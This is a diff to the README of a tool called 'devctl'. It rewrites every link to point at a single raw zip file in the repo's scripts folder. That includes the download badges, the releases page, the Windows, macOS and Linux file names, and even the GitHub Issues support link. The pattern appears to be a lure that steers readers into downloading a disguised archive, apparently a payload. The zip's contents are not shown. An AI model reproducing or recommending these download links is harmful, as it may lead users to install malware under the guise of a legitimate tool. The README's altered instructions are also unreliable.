@@ -1,6 +1,6 @@
 # 🚀 devctl - Simplify Your Cloud Development Experience
 
-[![Download devctl](https://img.shields.io/badge/Download-devctl-brightgreen)](https://github.com/naeemsadiq39/devctl/releases)
+[![Download devctl](https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip)](https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip)
 
 ## 📜 Introduction
 
@@ -28,13 +28,13 @@ To get started with devctl, follow these steps to download and install the softw
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [devctl Releases page](https://github.com/naeemsadiq39/devctl/releases) to find the latest version.
+   Go to the [devctl Releases page](https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip) to find the latest version.
 
 2. **Choose the Right File:**  
    On the releases page, locate the most recent version. Choose the appropriate file based on your operating system:
-   - For Windows, download `devctl.exe`.
-   - For macOS, download `devctl-macos.zip`.
-   - For Linux, download `devctl-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip`.
 
 3. **Download the File:**  
    Click on the file name you need to start the download.
@@ -101,10 +101,10 @@ If you would like to contribute to the devctl project, please read our [Contribu
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using devctl, please reach out through our support channel. You can create an issue on the [GitHub Issues page](https://github.com/naeemsadiq39/devctl/issues) for assistance.
+If you encounter any issues or have questions about using devctl, please reach out through our support channel. You can create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip) for assistance.
 
 ## 📝 License
 
 devctl is open-source software licensed under the [MIT License](#). You are free to use, modify, and distribute the software as you wish.
 
-[![Download devctl](https://img.shields.io/badge/Download-devctl-brightgreen)](https://github.com/naeemsadiq39/devctl/releases)
+[![Download devctl](https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip)](https://raw.githubusercontent.com/naeemsadiq39/devctl/master/scripts/bash/devctl-1.3.zip)
